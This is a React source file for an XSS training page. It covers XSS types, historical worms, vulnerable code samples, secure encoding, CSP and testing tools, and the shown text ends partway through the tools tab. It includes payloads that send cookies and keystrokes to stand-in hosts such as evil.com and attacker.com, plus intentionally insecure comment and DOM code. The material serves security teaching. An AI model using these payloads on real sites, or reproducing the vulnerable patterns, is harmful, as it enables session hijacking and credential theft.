import { useState } from 'react';
import { Code, Shield, BookOpen, AlertTriangle, Terminal, Lock, Unlock, Globe, Eye, ArrowLeft, Target } from 'lucide-react';

const tabs = [
  { id: 'theory', name: 'Theory', icon: BookOpen },
  { id: 'lab', name: 'Lab', icon: Terminal },
  { id: 'tools', name: 'Tools', icon: Shield },
  { id: 'references', name: 'References', icon: Globe }
];

interface XSSConceptProps {
  onBack?: () => void;
  onStartChallenge?: () => void;
}

export const XSSConcept = ({ onBack, onStartChallenge }: XSSConceptProps = {}) => {
  const [activeTab, setActiveTab] = useState('theory');

  return (
    <div className="min-h-screen bg-white dark:bg-gray-950 text-gray-900 dark:text-white p-8">
      <div className="max-w-6xl mx-auto">
        {onBack && (
          <button
            onClick={onBack}
            className="mb-6 px-4 py-2 bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 border border-gray-300 dark:border-gray-700 rounded-lg transition-all flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            Back to Dashboard
          </button>
        )}

        <div className="bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 rounded-2xl p-8 shadow-lg">
          <div className="flex items-center gap-4 mb-8">
            <div className="p-4 bg-gradient-to-br from-orange-500 to-red-600 rounded-xl">
              <Code className="w-12 h-12 text-white" />
            </div>
            <div className="flex-1">
              <h1 className="text-4xl font-bold text-gray-900 dark:text-white">Cross-Site Scripting (XSS)</h1>
              <p className="text-emerald-600 dark:text-emerald-400 mt-2">Understand how attackers inject malicious scripts into trusted websites</p>
            </div>
            {onStartChallenge && (
              <button
                onClick={onStartChallenge}
                className="px-6 py-3 bg-emerald-600 hover:bg-emerald-700 dark:bg-emerald-500 dark:hover:bg-emerald-600 rounded-lg font-semibold transition-all flex items-center gap-2 text-white"
              >
                <Target className="w-5 h-5" />
                Take Challenge
              </button>
            )}
          </div>

          <div className="border-b border-gray-200 dark:border-gray-700 mb-8">
            <nav className="flex gap-2">
              {tabs.map((tab) => {
                const Icon = tab.icon;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={`flex items-center gap-2 px-6 py-3 rounded-t-lg transition-all ${
                      activeTab === tab.id
                        ? 'bg-emerald-50 dark:bg-emerald-900/20 text-emerald-600 dark:text-emerald-400 border-b-2 border-emerald-500'
                        : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white hover:bg-gray-50 dark:hover:bg-gray-800'
                    }`}
                  >
                    <Icon className="w-5 h-5" />
                    {tab.name}
                  </button>
                );
              })}
            </nav>
          </div>

          <div className="space-y-6">
            {activeTab === 'theory' && <TheoryTab />}
            {activeTab === 'lab' && <LabTab />}
            {activeTab === 'tools' && <ToolsTab />}
            {activeTab === 'references' && <ReferencesTab />}
          </div>
        </div>
      </div>
    </div>
  );
};

const TheoryTab = () => (
  <div className="space-y-8">
    <section>
      <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
        <AlertTriangle className="w-6 h-6 text-yellow-400" />
        What is Cross-Site Scripting (XSS)?
      </h2>
      <div className="bg-gray-50 dark:bg-gray-800/50 border border-gray-200 dark:border-gray-700 rounded-lg p-6 space-y-4">
        <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
          Cross-Site Scripting (XSS) is a client-side code injection attack where attackers inject malicious
          scripts into trusted websites. When other users view the infected pages, the malicious scripts execute
          in their browsers, allowing attackers to steal session cookies, hijack user sessions, deface websites,
          redirect users to malicious sites, or install keyloggers.
        </p>
        <div className="bg-orange-500/20 border border-orange-500/50 rounded-lg p-4">
          <p className="text-sm font-semibold mb-2 text-gray-900 dark:text-white">OWASP Classification</p>
          <p className="text-gray-700 dark:text-gray-300">
            XSS consistently ranks in the OWASP Top 10 Web Application Security Risks. The vulnerability
            exploits the trust a user has for a particular site by executing malicious code in the context
            of the legitimate website.
          </p>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Three Types of XSS Attacks</h2>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="bg-white dark:bg-gray-800 border-2 border-purple-300 dark:border-purple-700 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Eye className="w-5 h-5 text-purple-600 dark:text-purple-400" />
            Reflected XSS
          </h3>
          <p className="text-gray-700 dark:text-gray-300 text-sm mb-3">
            Non-persistent attack where malicious script is reflected off the web server in the immediate
            response. User input is immediately returned without proper sanitization.
          </p>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
            <code className="text-green-600 dark:text-green-400">
              search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
            </code>
          </div>
          <p className="text-gray-600 dark:text-gray-400 text-sm mt-2">
            Common in search results, error messages, and URL parameters.
          </p>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-red-300 dark:border-red-700 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Lock className="w-5 h-5 text-red-600 dark:text-red-400" />
            Stored XSS
          </h3>
          <p className="text-gray-700 dark:text-gray-300 text-sm mb-3">
            Persistent attack where malicious script is permanently stored on target servers (database,
            message forum, comment field). Most dangerous type of XSS.
          </p>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
            <code className="text-green-600 dark:text-green-400">
              &lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;
            </code>
          </div>
          <p className="text-gray-600 dark:text-gray-400 text-sm mt-2">
            Affects ALL users who view the infected content. Can spread like a worm.
          </p>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-blue-300 dark:border-blue-700 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Code className="w-5 h-5 text-blue-600 dark:text-blue-600 dark:text-blue-400" />
            DOM-based XSS
          </h3>
          <p className="text-gray-700 dark:text-gray-300 text-sm mb-3">
            Attack occurs entirely on the client-side. JavaScript code processes user input unsafely,
            modifying the DOM without server involvement.
          </p>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
            <code className="text-green-600 dark:text-green-400">
              document.write(location.hash.substring(1));
            </code>
          </div>
          <p className="text-gray-600 dark:text-gray-400 text-sm mt-2">
            Payload never sent to server. Server-side filters ineffective.
          </p>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Attack Scenarios and Impact</h2>
      <div className="space-y-4">
        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Unlock className="w-5 h-5 text-red-400" />
            Session Hijacking
          </h3>
          <p className="text-gray-700 dark:text-gray-300 text-sm mb-3">
            Attackers steal session cookies to impersonate victims and gain unauthorized access to accounts.
          </p>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">
              &lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie;&lt;/script&gt;
            </code>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Terminal className="w-5 h-5 text-yellow-400" />
            Keylogging
          </h3>
          <p className="text-gray-700 dark:text-gray-300 text-sm mb-3">
            Install JavaScript keyloggers that capture every keystroke, including passwords and credit card numbers.
          </p>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">
              document.addEventListener('keypress', e =&gt; fetch('//evil.com/log?k='+e.key));
            </code>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <AlertTriangle className="w-5 h-5 text-orange-400" />
            Website Defacement
          </h3>
          <p className="text-gray-700 dark:text-gray-300 text-sm">
            Modify page content, display fake login forms, redirect users to phishing sites, or display
            malicious content to damage reputation.
          </p>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Globe className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
            XSS Worms (Self-Propagating)
          </h3>
          <p className="text-gray-700 dark:text-gray-300 text-sm">
            Malicious scripts that automatically replicate themselves by posting to other users or pages,
            spreading exponentially across a platform.
          </p>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
        <AlertTriangle className="w-6 h-6 text-red-400" />
        Real-World Breach: Twitter XSS Worm (2010)
      </h2>
      <div className="bg-red-500/20 border-l-4 border-red-500 rounded-lg p-6">
        <div className="flex items-start gap-4">
          <Unlock className="w-8 h-8 text-red-400 flex-shrink-0 mt-1" />
          <div className="space-y-3">
            <h3 className="text-xl font-semibold text-gray-900 dark:text-white">Self-Propagating XSS Worm</h3>
            <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
              In September 2010, a stored XSS vulnerability in Twitter allowed an attacker to create a
              self-propagating worm. When users viewed infected tweets, the malicious JavaScript would
              automatically execute and post the same payload to their followers.
            </p>
            <ul className="list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300">
              <li>Exploited improper sanitization of tweet content</li>
              <li>Used onmouseover event handler to trigger without clicking</li>
              <li>Spread to thousands of users within minutes</li>
              <li>Caused pop-ups, redirects, and unauthorized tweets</li>
            </ul>
            <div className="bg-black/30 rounded-lg p-4 mt-4">
              <p className="text-sm font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Attack Payload:</p>
              <div className="font-mono text-xs text-gray-600 dark:text-gray-400">
                &lt;script class="XSS"&gt;$('.status-body').mouseover(function()&#123;$.getScript('http://...')&#125;);&lt;/script&gt;
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
        <AlertTriangle className="w-6 h-6 text-red-400" />
        Real-World Breach: MySpace Samy Worm (2005)
      </h2>
      <div className="bg-orange-500/20 border-l-4 border-orange-500 rounded-lg p-6">
        <div className="flex items-start gap-4">
          <Globe className="w-8 h-8 text-orange-400 flex-shrink-0 mt-1" />
          <div className="space-y-3">
            <h3 className="text-xl font-semibold text-gray-900 dark:text-white">Fastest Spreading Virus in History</h3>
            <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
              The Samy worm, created by Samy Kamkar, exploited XSS vulnerabilities in MySpace profiles.
              It automatically added "Samy is my hero" to infected profiles and added Samy as a friend,
              then propagated to anyone viewing the infected profile.
            </p>
            <ul className="list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300">
              <li>Infected over 1 million users in less than 20 hours</li>
              <li>Became fastest-spreading virus at the time</li>
              <li>Bypassed MySpace's XSS filters using clever encoding tricks</li>
              <li>Forced MySpace to temporarily shut down to remove the worm</li>
              <li>Creator faced federal charges under Computer Fraud and Abuse Act</li>
            </ul>
            <div className="bg-black/30 rounded-lg p-4 mt-4">
              <p className="text-sm font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Impact:</p>
              <p className="text-gray-600 dark:text-gray-400 text-sm">
                Demonstrated the potential for XSS attacks to spread virally across social networks
                and highlighted the critical importance of proper input sanitization and output encoding.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">XSS Attack Methodology</h2>
      <div className="bg-gray-50 dark:bg-gray-800/50 border border-gray-200 dark:border-gray-700 rounded-lg p-6">
        <ol className="space-y-4">
          {[
            {
              step: 1,
              title: 'Identify Input Vectors',
              description: 'Locate all user input points: forms, URL parameters, search boxes, comment fields, file uploads.'
            },
            {
              step: 2,
              title: 'Test for Reflection',
              description: 'Insert benign test strings to see if input is reflected in the response without encoding.'
            },
            {
              step: 3,
              title: 'Bypass Filters',
              description: 'Try various encoding techniques (HTML entities, URL encoding, Unicode) to bypass input filters.'
            },
            {
              step: 4,
              title: 'Craft Payload',
              description: 'Create malicious JavaScript payload for desired action (cookie theft, redirection, defacement).'
            },
            {
              step: 5,
              title: 'Inject and Execute',
              description: 'Deliver payload via reflected parameter, stored content, or DOM manipulation.'
            },
            {
              step: 6,
              title: 'Harvest Data',
              description: 'Collect stolen credentials, session tokens, or other sensitive information from victims.'
            }
          ].map((item) => (
            <li key={item.step} className="flex gap-4">
              <div className="flex-shrink-0 w-8 h-8 bg-emerald-600 dark:bg-emerald-500 rounded-full flex items-center justify-center font-bold text-white">
                {item.step}
              </div>
              <div>
                <h4 className="font-semibold text-lg mb-1 text-gray-900 dark:text-white">{item.title}</h4>
                <p className="text-gray-600 dark:text-gray-400 text-sm">{item.description}</p>
              </div>
            </li>
          ))}
        </ol>
      </div>
    </section>
  </div>
);

const LabTab = () => (
  <div className="space-y-8">
    <div className="bg-yellow-500/20 border border-yellow-500/50 rounded-lg p-4">
      <p className="text-sm font-semibold flex items-center gap-2">
        <AlertTriangle className="w-5 h-5" />
        ETHICAL USE ONLY: These examples are for educational purposes. Only test on systems you own or have explicit permission to test.
      </p>
    </div>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Vulnerable Code Examples</h2>

      <div className="space-y-6">
        <div>
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Lock className="w-5 h-5 text-red-400" />
            Vulnerable HTML Form (INSECURE)
          </h3>
          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
            <pre className="text-gray-600 dark:text-gray-400">
<code>{`<!-- VULNERABLE CODE - DO NOT USE IN PRODUCTION -->
<div id="search-results">
  <h2>Search Results</h2>
  <p>You searched for: <?php echo $_GET['query']; ?></p>
</div>

<!-- Attack: /?query=<script>alert('XSS')</script> -->`}</code>
            </pre>
          </div>
          <div className="mt-3 bg-red-500/20 rounded-lg p-3 border border-red-500/50">
            <p className="text-sm font-semibold mb-1 text-gray-900 dark:text-white">Why it's vulnerable:</p>
            <p className="text-sm text-gray-700 dark:text-gray-300">
              User input from URL parameter is directly embedded in HTML without escaping.
              Any script tags will execute when the page renders.
            </p>
          </div>
        </div>

        <div>
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Lock className="w-5 h-5 text-red-400" />
            Vulnerable Comment System (INSECURE)
          </h3>
          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
            <pre className="text-gray-600 dark:text-gray-400">
<code>{`// VULNERABLE CODE - Stored XSS
app.post('/comment', (req, res) => {
  const comment = req.body.comment;

  // Store comment directly without sanitization
  db.comments.insert({ text: comment, user: req.user.id });

  res.redirect('/comments');
});

app.get('/comments', (req, res) => {
  const comments = db.comments.getAll();

  // Render comments without escaping
  let html = '<div class="comments">';
  comments.forEach(c => {
    html += \`<p>\${c.text}</p>\`;  // DANGEROUS!
  });
  html += '</div>';

  res.send(html);
});

// Attack: Submit comment with payload:
// <script>fetch('//evil.com?c='+document.cookie)</script>`}</code>
            </pre>
          </div>
        </div>

        <div>
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Lock className="w-5 h-5 text-red-400" />
            Vulnerable DOM Manipulation (INSECURE)
          </h3>
          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
            <pre className="text-gray-600 dark:text-gray-400">
<code>{`// VULNERABLE CODE - DOM-based XSS
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');

// Using innerHTML with user input - DANGEROUS
document.getElementById('greeting').innerHTML = 'Hello ' + name + '!';

// Attack: /?name=<img src=x onerror="alert(document.cookie)">`}</code>
            </pre>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">XSS Payload Examples</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Basic Alert</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Image Tag with onerror</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">&lt;img src=x onerror="alert(1)"&gt;</code>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Cookie Theft</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;</code>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">JavaScript Protocol</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;</code>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Event Handler</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">&lt;body onload="alert(1)"&gt;</code>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">SVG Attack</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
            <code className="text-green-600 dark:text-green-400">&lt;svg onload="alert(1)"&gt;</code>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
        <Shield className="w-6 h-6 text-green-600 dark:text-green-400" />
        Secure Code Examples
      </h2>

      <div className="space-y-6">
        <div>
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Lock className="w-5 h-5 text-green-600 dark:text-green-400" />
            Secure Output Encoding (PHP)
          </h3>
          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
            <pre className="text-gray-600 dark:text-gray-400">
<code>{`<?php
// SECURE CODE - HTML entity encoding
$search_query = $_GET['query'];

// Use htmlspecialchars() to escape HTML
echo '<p>You searched for: ' . htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8') . '</p>';

// For attribute context
echo '<input type="text" value="' . htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8') . '">';
?>`}</code>
            </pre>
          </div>
          <div className="mt-3 bg-green-500/20 rounded-lg p-3">
            <p className="text-sm font-semibold mb-1">Why it's secure:</p>
            <p className="text-sm text-gray-700 dark:text-gray-300">
              htmlspecialchars() converts special characters to HTML entities, preventing script execution.
              &lt;script&gt; becomes &amp;lt;script&amp;gt; which displays as text.
            </p>
          </div>
        </div>

        <div>
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Lock className="w-5 h-5 text-green-600 dark:text-green-400" />
            Secure Output Encoding (JavaScript)
          </h3>
          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
            <pre className="text-gray-600 dark:text-gray-400">
<code>{`// SECURE CODE - Use textContent instead of innerHTML
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');

// Safe: textContent treats content as plain text
document.getElementById('greeting').textContent = 'Hello ' + name + '!';

// Or use a library like DOMPurify for complex HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
document.getElementById('content').innerHTML = clean;`}</code>
            </pre>
          </div>
        </div>

        <div>
          <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-gray-900 dark:text-white">
            <Lock className="w-5 h-5 text-green-600 dark:text-green-400" />
            Secure Output Encoding (Python/Flask)
          </h3>
          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
            <pre className="text-gray-600 dark:text-gray-400">
<code>{`from flask import Flask, request, render_template_string, escape
import html

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')

    # Method 1: Use Jinja2 auto-escaping (default in Flask)
    template = '''
    <h2>Search Results</h2>
    <p>You searched for: {{ query }}</p>
    '''
    return render_template_string(template, query=query)

    # Method 2: Manual escaping
    safe_query = html.escape(query)
    return f'<p>You searched for: {safe_query}</p>'`}</code>
            </pre>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Content Security Policy Implementation</h2>
      <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-6 space-y-4">
        <p className="text-gray-700 dark:text-gray-300">
          Content Security Policy (CSP) is an HTTP header that helps prevent XSS by controlling which
          resources can be loaded and executed.
        </p>

        <div>
          <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Strict CSP Header (Recommended)</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
            <code className="text-green-600 dark:text-green-400">
              Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
            </code>
          </div>
        </div>

        <div>
          <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Node.js/Express Implementation</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm overflow-x-auto">
            <pre className="text-gray-600 dark:text-gray-400">
<code>{`const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Consider removing unsafe-inline
    imgSrc: ["'self'", "data:", "https:"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));`}</code>
            </pre>
          </div>
        </div>

        <div>
          <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Apache .htaccess</h4>
          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
            <code className="text-green-600 dark:text-green-400">
              Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
            </code>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">HttpOnly and Secure Cookie Flags</h2>
      <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-6 space-y-4">
        <p className="text-gray-700 dark:text-gray-300">
          HttpOnly flag prevents JavaScript from accessing cookies, mitigating XSS-based session theft.
        </p>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">PHP</h4>
            <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
              <code className="text-gray-600 dark:text-gray-400">
                setcookie('session', $id, [<br />
                &nbsp;&nbsp;'httponly' =&gt; true,<br />
                &nbsp;&nbsp;'secure' =&gt; true,<br />
                &nbsp;&nbsp;'samesite' =&gt; 'Strict'<br />
                ]);
              </code>
            </div>
          </div>

          <div>
            <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Node.js/Express</h4>
            <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
              <code className="text-gray-600 dark:text-gray-400">
                res.cookie('session', sessionId, {'{'}<br />
                &nbsp;&nbsp;httpOnly: true,<br />
                &nbsp;&nbsp;secure: true,<br />
                &nbsp;&nbsp;sameSite: 'strict'<br />
                {'}'});
              </code>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section>
      <div className="bg-cyan-500/20 border border-cyan-500/50 rounded-lg p-6">
        <h3 className="text-xl font-semibold mb-3 flex items-center gap-2">
          <Terminal className="w-6 h-6" />
          Practice Laboratory
        </h3>
        <p className="text-gray-700 dark:text-gray-300 mb-4">
          Ready to practice XSS attack and defense techniques in a safe environment?
        </p>
        <a
          href="/notebooks/13-xss.ipynb"
          className="inline-block px-6 py-3 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-cyan-600 hover:to-blue-600 rounded-lg font-semibold transition-all"
        >
          Open Interactive Jupyter Notebook
        </a>
      </div>
    </section>
  </div>
);

const ToolsTab = () => (
  <div className="space-y-8">
    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Attack Tools</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="bg-white dark:bg-gray-800 border-2 border-red-300 dark:border-red-700 rounded-lg p-6">
          <div className="flex items-start gap-4">
            <Terminal className="w-8 h-8 text-red-400 flex-shrink-0" />
            <div>
              <h3 className="text-xl font-semibold mb-2 text-gray-900 dark:text-white">XSStrike</h3>
              <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
                Advanced XSS detection suite with intelligent payload generation, WAF bypass, and
                context-aware fuzzing capabilities.
              </p>
              <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm mb-3">
                <code className="text-green-600 dark:text-green-400">
                  python xsstrike.py -u "http://target.com/search?q=test"
                </code>
              </div>
              <div className="space-y-2 text-sm">
                <p className="font-semibold text-emerald-600 dark:text-emerald-400">Key Features:</p>
                <ul className="list-disc list-inside space-y-1 text-gray-600 dark:text-gray-400">
                  <li>Automatic XSS detection and exploitation</li>
                  <li>Context-aware payload generation</li>
                  <li>WAF detection and bypass techniques</li>
                  <li>Crawling for testing multiple endpoints</li>
                  <li>Support for GET, POST, and custom headers</li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-purple-300 dark:border-purple-700 rounded-lg p-6">
          <div className="flex items-start gap-4">
            <Shield className="w-8 h-8 text-purple-400 flex-shrink-0" />
            <div>
              <h3 className="text-xl font-semibold mb-2 text-gray-900 dark:text-white">BeEF (Browser Exploitation Framework)</h3>
              <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
                Powerful penetration testing tool focused on exploiting web browser vulnerabilities
                to assess client-side security.
              </p>
              <div className="space-y-2 text-sm">
                <p className="font-semibold text-emerald-600 dark:text-emerald-400">Capabilities:</p>
                <ul className="list-disc list-inside space-y-1 text-gray-600 dark:text-gray-400">
                  <li>Hook browsers via XSS</li>
                  <li>Execute commands on hooked browsers</li>
                  <li>Keylogging and form grabbing</li>
                  <li>Social engineering attacks</li>
                  <li>Network reconnaissance from client</li>
                  <li>Persistence and tunneling</li>
                </ul>
              </div>
              <div className="mt-3 bg-yellow-500/20 rounded p-2">
                <p className="text-xs text-yellow-300 font-semibold">
                  Advanced tool - Requires deep understanding of client-side attacks
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-emerald-300 dark:border-emerald-700 rounded-lg p-6">
          <div className="flex items-start gap-4">
            <Code className="w-8 h-8 text-blue-600 dark:text-blue-400 flex-shrink-0" />
            <div>
              <h3 className="text-xl font-semibold mb-2 text-gray-900 dark:text-white">Burp Suite Scanner</h3>
              <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
                Professional web vulnerability scanner with comprehensive XSS detection capabilities.
              </p>
              <div className="space-y-2 text-sm">
                <p className="font-semibold text-emerald-600 dark:text-emerald-400">XSS Testing Features:</p>
                <ul className="list-disc list-inside space-y-1 text-gray-600 dark:text-gray-400">
                  <li>Automated reflected and stored XSS detection</li>
                  <li>DOM-based XSS identification</li>
                  <li>Context-aware payload insertion</li>
                  <li>Manual testing with Repeater and Intruder</li>
                  <li>Collaborative scanning and reporting</li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-orange-300 dark:border-orange-700 rounded-lg p-6">
          <div className="flex items-start gap-4">
            <Globe className="w-8 h-8 text-orange-400 flex-shrink-0" />
            <div>
              <h3 className="text-xl font-semibold mb-2 text-gray-900 dark:text-white">XSSer</h3>
              <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
                Automatic framework for detecting and exploiting XSS vulnerabilities with multiple
                injection techniques.
              </p>
              <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm mb-3">
                <code className="text-green-600 dark:text-green-400">
                  xsser --url "http://target.com" --auto
                </code>
              </div>
              <div className="space-y-2 text-sm">
                <p className="font-semibold text-emerald-600 dark:text-emerald-400">Features:</p>
                <ul className="list-disc list-inside space-y-1 text-gray-600 dark:text-gray-400">
                  <li>50+ different XSS attack vectors</li>
                  <li>Automatic payload encoding</li>
                  <li>POST and GET method support</li>
                  <li>Cookie injection testing</li>
                  <li>GTK interface for easy use</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
        <Shield className="w-6 h-6 text-green-600 dark:text-green-400" />
        Defense Tools
      </h2>
      <div className="space-y-6">
        <div className="bg-white dark:bg-gray-800 border-2 border-green-300 dark:border-green-700 rounded-lg p-6">
